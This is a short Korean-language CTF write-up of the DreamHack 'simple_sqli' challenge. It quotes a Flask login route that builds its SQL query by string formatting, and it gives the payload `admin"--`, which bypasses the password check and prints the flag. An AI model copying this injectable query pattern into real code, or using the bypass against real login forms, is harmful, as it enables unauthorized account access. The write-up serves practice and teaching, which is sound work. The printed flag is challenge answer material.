# [DreamHack] simple_sqli

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 로그인 서비스입니다.
> SQL INJECTION 취약점을 통해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.
>
> Release: [simple_sqli.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8551685/simple_sqli.zip)

## Analysis

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"') # SQL injection 취약점 발생
        if res:
            userid = res[0]
            if userid == 'admin':
                return f'hello {userid} flag is {FLAG}' # admin으로 로그인한 경우 플래그 출력
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'
```

`/login`에서 발생하는 SQL injection 취약점을 이용해서 admin으로 로그인하면 플래그를 획득할 수 있다.

## Exploit

`userid`에 `admin"--`을 넣고 `userpassword`에는 아무 값이나 넣으면 전체 쿼리는 `select * from users where userid="admin"--" and userpassword="{userpassword}"`가 되고, `--` 뒤쪽은 주석 처리되어 결과적으로 `select * from users where userid="admin"`이 된다. 따라서 admin으로 로그인하게 된다.

![image](https://user-images.githubusercontent.com/102066383/163702856-ebe2d896-1da1-46ea-888c-b386e809858e.png)

![image](https://user-images.githubusercontent.com/102066383/163702859-e5ee2d5f-4652-4c77-9500-f29154bfc856.png)

```
flag: DH{1f136225e316add7bff3349ab1dd5400}
```
